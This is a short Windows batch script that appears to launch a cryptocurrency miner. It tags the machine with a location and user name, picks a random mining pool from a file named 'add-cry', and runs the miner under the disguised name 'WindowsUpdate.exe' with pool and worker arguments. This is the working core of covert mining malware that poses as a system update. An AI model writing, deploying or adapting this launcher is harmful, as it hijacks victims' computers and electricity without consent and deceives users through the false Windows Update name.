set /p GEO=<location.txt
set USERNAME=%USERNAME: =_%
set USERNAME=%USERNAME:-=_%
set USERNAME=%GEO%-%USERNAME%


set /a count=0
for /f "tokens=1delims=:" %%i in ('findstr /n "^" "add-cry"') do set /a count=%%i
set /a rd=%random%%%count
if %rd% equ 0 (set "skip=") else set "skip=skip=%rd%"
set "found="
for /f "%skip%tokens=1*delims=:" %%i in ('findstr /n "^" "add-cry"') do if not defined found set "found=%%i"&set "pool=%%j"

WindowsUpdate.exe -o %pool% -p %username%